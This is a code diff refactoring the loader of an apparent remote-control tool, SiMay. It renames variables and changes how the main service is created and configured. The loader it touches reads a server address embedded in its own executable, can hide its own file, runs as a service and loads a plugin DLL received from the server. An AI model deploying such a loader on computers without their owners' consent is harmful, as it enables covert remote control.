@@ -57,8 +57,6 @@ namespace SiMay.RemoteService.Loader
         /// </summary>
         private const string MAIN_PLUGIN_COMNAME = "SiMayService.Core.dll";
 
-
-        private static bool _systemPermission;
         private static IPEndPoint _ipendPoint;
         private static StartParameter _startParameter;
         private static IAppMainService _appMainService;
@@ -90,15 +88,15 @@ namespace SiMay.RemoteService.Loader
                     RunTimeText = DateTime.Now.ToString(),
                     UniqueId = "AAAAAAAAAAAAAAA11111111"
                 };
-                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
-                var flag = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
+                byte[] selfStartupBinary = File.ReadAllBytes(Application.ExecutablePath);
+                var flag = BitConverter.ToInt16(selfStartupBinary, selfStartupBinary.Length - sizeof(Int16));
                 if (flag == 9999)
                 {
-                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
+                    var length = BitConverter.ToInt32(selfStartupBinary, selfStartupBinary.Length - sizeof(Int16) - sizeof(Int32));
                     byte[] bytes = new byte[length];
-                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
+                    Array.Copy(selfStartupBinary, selfStartupBinary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
 
-                    var options = PacketSerializeHelper.DeserializePacket<Core.Entitys.ServiceOptions>(bytes);
+                    var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
                     _startParameter.Host = options.Host;
                     _startParameter.Port = options.Port;
                     _startParameter.RemarkInformation = options.Remark;
@@ -123,7 +121,7 @@ namespace SiMay.RemoteService.Loader
                 }
 
                 //是否服务安装
-                _systemPermission = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));
+                _startParameter.SystemPermission = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));
 
                 if (_startParameter.IsHide)
                     SystemSessionHelper.FileHide(true);
@@ -182,7 +180,7 @@ namespace SiMay.RemoteService.Loader
                         case TcpSessionNotify.OnConnected:
 
                             var ackData = MessageHelper.CopyMessageHeadTo(C_GLOBAL_CONNECT,
-                                new LoaderAckPacket()
+                                new LoaderAcknowledPacket()
                                 {
                                     Type = MAIN_CONNECT,
                                     AccessId = 0,
@@ -283,11 +281,15 @@ namespace SiMay.RemoteService.Loader
             if (_pluginCOMs.ContainsKey(MAIN_PLUGIN_COMNAME))
             {
                 var assembly = Assembly.Load(_pluginCOMs[MAIN_PLUGIN_COMNAME]);
-                var mainType = assembly.GetTypes().Where(c => typeof(IAppMainService).IsAssignableFrom(c)).FirstOrDefault();
-                if (mainType == null)
+                var mainApplicationServiceType = assembly.GetTypes().Where(c => typeof(IAppMainService).IsAssignableFrom(c)).FirstOrDefault();
+                if (mainApplicationServiceType == null)
                     return;
 
-                _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _ipendPoint, _systemPermission) as IAppMainService;
+                _appMainService = Activator.CreateInstance(mainApplicationServiceType) as IAppMainService;
+                _appMainService.RemoteIPEndPoint = _ipendPoint;
+                _appMainService.SessionProvider = _clientAgent;
+                _appMainService.StartParameter = _startParameter;
+                _appMainService.StartService(session);
             }
         }
 
